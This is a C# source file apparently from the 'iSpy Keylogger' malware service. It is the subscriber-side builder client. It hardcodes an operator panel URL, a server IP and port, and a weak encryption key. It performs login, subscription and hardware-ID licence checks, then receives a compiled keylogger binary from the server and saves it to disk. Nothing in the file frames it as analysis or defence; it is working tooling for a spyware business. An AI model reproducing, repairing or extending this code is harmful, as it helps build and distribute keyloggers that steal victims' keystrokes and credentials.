using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Net;
using iSpy_Keylogger;
namespace Networking
{
    public class GlobalVariables
    {
        public static string version = "2.0";
        public static string site = "http://ispy.pw/panel/login";
        private static byte[] key = { 1, 2, 3, 4, 5, 
                                      1, 2, 3, 4, 5,
                                      1, 2, 3, 4, 5,
                                      1, 2, 3, 4, 5,
                                      1, 2, 3, 4, 5 };        
        //private static string server = Dns.GetHostAddresses("ispycompile.ddns.net")[0].ToString();
        private static ushort port = 4000;
        private static Socket client;
        //public static string server = "127.0.0.1";
        public static string server = "23.239.79.135";

        public static object locky = new object();
        public static QuickLZ qlz = new QuickLZ();
        public static frmLogin LoginForm;
        public static frmMain MainForm = new frmMain();
        public static string Username = string.Empty;
        public static string HWID = string.Empty;
        public static string ExpirationDate = string.Empty;
        public static string savePath = string.Empty;
        public static Encryption cryptor = new Encryption();
        
        public static void Listen(object o)
        {
            cryptor = new Encryption();
            while (true)
            {
                client = new Socket(ws2_32.AddressFamily.InterNetworkv4, ws2_32.ProtocolType.Tcp, ws2_32.SocketType.Stream);
                client.EnableSizeHeader = true;
                client.HeaderSize = Socket.HeaderTypeSize.INT;
                client.Initialize(8192 * 10, 8192 * 10);
                int option = 1;
                System.Net.Sockets.SocketError error = ws2_32.setsockopt(client.Handle, System.Net.Sockets.SocketOptionLevel.Socket, System.Net.Sockets.SocketOptionName.KeepAlive, ref option, 4);
                client.Connect(server, port);

                while (client.Connected)
                {
                    byte[] buffer = client.Receive();

                    if (!client.Connected || buffer.Length == 0)
                        break;
                    try
                    {
                        if (client.Connected)
                        {
                            Console.WriteLine("Recieved Packet: " + buffer.Length);
                            buffer = cryptor.Decrypt(buffer, key);
                            bool isCompressed = buffer[0] == 0x01;
                            Array.Copy(buffer, 1, buffer, 0, buffer.Length - 1);
                            Array.Resize(ref buffer, buffer.Length - 1);
                            if (isCompressed)
                            {
                                buffer = qlz.decompress(buffer, 0, buffer.Length);
                            }
                            Thread t = new Thread(new ParameterizedThreadStart(ProcessPacket));
                            t.SetApartmentState(ApartmentState.STA);
                            t.Start(buffer);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                        GlobalVariables.DumpErrorLog(ex);
                        break;
                    }
                }
                Environment.Exit(0);
            }

        }

        public static void ProcessPacket(object buff)
        {
            byte[] buffer = (byte[])buff;
            PayloadReader pr = new PayloadReader(buffer);
            PayloadWriter pw = new PayloadWriter();
            Command cmd = (Command)pr.ReadByte();
            if (cmd == Command.InvalidLogin)
            {
                MessageBox.Show("Invalid login credentials", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LoginForm.tbPassword.Enabled = true;
                LoginForm.tbUsername.Enabled = true;
                LoginForm.btnLogin.Enabled = true;
            }
            else if (cmd == Command.Login)
            {
                GlobalVariables.LoginForm.Hide();
                GlobalVariables.ExpirationDate = pr.ReadString();
                GlobalVariables.MainForm.ShowDialog();
            }
            else if (cmd == Command.Banned)
            {
                MessageBox.Show("This user is banned.", "Banned", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LoginForm.tbPassword.Enabled = true;
                LoginForm.tbUsername.Enabled = true;
                LoginForm.btnLogin.Enabled = true;
            }
            else if (cmd == Command.NoSubscription)
            {
                MessageBox.Show("This user is not currently subscribed to iSpy Keylogger", "No Subscription", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LoginForm.tbPassword.Enabled = true;
                LoginForm.tbUsername.Enabled = true;
                LoginForm.btnLogin.Enabled = true;
            }
            else if (cmd == Command.InvalidHWID)
            {
                MessageBox.Show("Your HWID does not match the user account", "Invalid HWID", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LoginForm.tbPassword.Enabled = true;
                LoginForm.tbUsername.Enabled = true;
                LoginForm.btnLogin.Enabled = true;
            }
            else if (cmd == Command.CompileiSpyKeylogger)
            {
                byte[] file = pr.ReadBytes(pr.ReadInteger());
                MainForm.tbBuildLog.Text += "> Recieved file size: " + file.Length + " bytes" + Environment.NewLine;
                File.WriteAllBytes(savePath, file);
                MainForm.tbBuildLog.Text += "> File saved at: " + savePath;
                MainForm.Enabled = true;
            }
            else if (cmd == Command.BadVersion)
            {
                MessageBox.Show("Download the updated version from the webpanel!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
        }
        public enum Command : byte
        {
            InvalidLogin = 0x00,
            Login = 0x01,
            Banned = 0x02,
            NoSubscription = 0x03,
            InvalidHWID = 0x04,
            CompileiSpyKeylogger = 0x05,
            BadVersion = 0x06

        }
        public static void SendData(byte[] data)
        {
            List<byte> toSend = new List<byte>();
            Console.WriteLine(data.Length);
            if (data.Length > 10 && qlz.sizeCompressed(data, 0) < data.Length)
            {
                toSend.Add(0x01);
                data = qlz.compress(data, 0, data.Length, 3);
            }
            else
            {
                toSend.Add(0x00);
            }
            toSend.AddRange(data);
            //client.SendPacket(toSend.ToArray());
            client.SendPacket(cryptor.Encrypt(toSend.ToArray(), GlobalVariables.key));
        }

        public static void DumpErrorLog(Exception ex)
        {
            StackTrace trace = new StackTrace(ex, true);

            string ErrorLog = "[iSpy Keylogger - Error] " + "Function: " + trace.GetFrame(0).GetMethod().Name + "\r\n" +
                              "Line: " + trace.GetFrame(0).GetFileLineNumber() + "\r\n" +
                              "Column: " + trace.GetFrame(0).GetFileColumnNumber() + "\r\n" +
                              "Message: " + ex.Message + "\r\n" +
                              "Stacktrace: " + ex.StackTrace;
            Debug.WriteLine(ErrorLog);
            Console.WriteLine(ErrorLog);
        }
    }
}
